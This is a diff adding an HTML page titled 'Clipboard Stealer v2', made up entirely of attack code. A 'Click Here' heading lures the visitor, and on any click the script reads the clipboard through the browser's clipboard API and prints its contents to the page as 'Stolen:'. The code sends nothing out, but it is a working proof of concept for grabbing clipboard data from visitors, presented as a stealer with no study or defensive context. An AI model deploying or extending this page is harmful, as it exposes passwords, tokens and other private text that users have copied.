@@ -1,0 +1,17 @@
+<html>
+<head>
+<title>Clipboard Stealer v2</title>
+</head>
+<body>
+<h1>Click Here</h1>
+<script>
+document.body.onclick = function() {
+    navigator.clipboard.readText().then(function(text) {
+        document.write('Stolen: ' + text);
+    }).catch(function(e) {
+        document.write('Error: ' + e);
+    });
+};
+</script>
+</body>
+</html>
